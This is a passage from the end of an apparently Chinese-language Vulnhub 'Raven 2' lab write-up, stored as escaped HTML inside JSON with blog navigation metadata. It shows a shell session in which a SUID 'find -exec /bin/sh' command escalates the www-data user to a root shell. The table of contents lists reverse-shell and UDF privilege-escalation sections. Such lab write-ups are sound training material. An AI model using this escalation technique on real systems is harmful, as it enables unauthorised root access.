class=\"line\">id</span><br><span class=\"line\">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class=\"line\"></span><br><span class=\"line\">www-data@Raven:/tmp$ find finn -<span class=\"built_in\">exec</span> <span class=\"string\">&quot;/bin/sh&quot;</span> \\;</span><br><span class=\"line\">find finn -<span class=\"built_in\">exec</span> <span class=\"string\">&quot;/bin/sh&quot;</span> \\;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># id</span></span><br><span class=\"line\">id</span><br><span class=\"line\">uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)</span><br><span class=\"line\"><span class=\"comment\"># whoami</span></span><br><span class=\"line\">whoami</span><br><span class=\"line\">root</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>打完收工。</p>\n","prev":{"title":"Vulnhub Typhoon-v1.02","link":"/Vulnhub-Typhoon-v1-02"},"next":{"title":"picoCTF2018 Writeup之Forensics篇","link":"/picoCTF2018-Writeup之Forensics篇"},"plink":"https://pineswen.tk//Vulnhub-Raven-2/","toc":[{"id":"主机发现","title":"主机发现","index":"1"},{"id":"端口探测","title":"端口探测","index":"2"},{"id":"目录猜解","title":"目录猜解","index":"3"},{"id":"反弹shell","title":"反弹SHELL","index":"4"},{"id":"udf提权","title":"UDF提权","index":"5"}]}